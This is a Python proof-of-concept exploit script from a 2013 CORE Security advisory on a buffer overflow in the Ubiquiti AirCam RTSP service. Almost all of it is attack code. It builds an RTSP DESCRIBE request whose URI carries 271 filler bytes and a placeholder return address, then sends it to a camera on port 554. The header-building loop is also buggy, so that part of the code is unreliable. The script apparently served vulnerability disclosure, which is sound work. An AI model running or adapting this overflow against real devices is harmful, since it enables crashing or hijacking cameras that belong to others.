#
# Author: Andres Blanco - CORE Security Technologies.
#
# The contents of this software are copyright (c) 2013 CORE Security and (c) 2013 CoreLabs,
# and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
# License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/us/">http://creativecommons.org/licenses/by-nc-sa/3.0/us/</a>
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE.
#
 
import socket
 
class RtspRequest(object):
 
    def __init__(self, ip_address, port):
        self._ip_address = ip_address
        self._port = port
 
    def generate_request(self, method, uri, headers):
        data = ""
        data += "%s %s RTSP/1.0\r\n" % (method, uri)
        for item in headers:
            header = headers
            data += "%s: %s\r\n" % (item, header)
        data += "\r\n"
        return data
 
    def send_request(self, data):
        sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sd.settimeout(15)
        sd.connect((self._ip_address, self._port))
        sd.send(data)
        resp = sd.recv(2048)
        sd.close()
        return resp
 
if __name__ == "__main__":
    ip = "192.168.100.1"
    anRtsp = RtspRequest(ip, 554)
    data = ""
    data += "A" * 271
    data += "\x78\x56\x34\x12"
    uri = "rtsp://%s/%s/live/ch00_0" % (ip, data)
    headers = { "CSeq" : "1" }
    req = anRtsp.generate_request("DESCRIBE", uri, headers)
    rsp = anRtsp.send_request(req)
- See more at: http://www.coresecurity.com/advisories/buffer-overflow-ubiquiti-aircam-rtsp-service#sthash.K4p3HBrf.dpuf
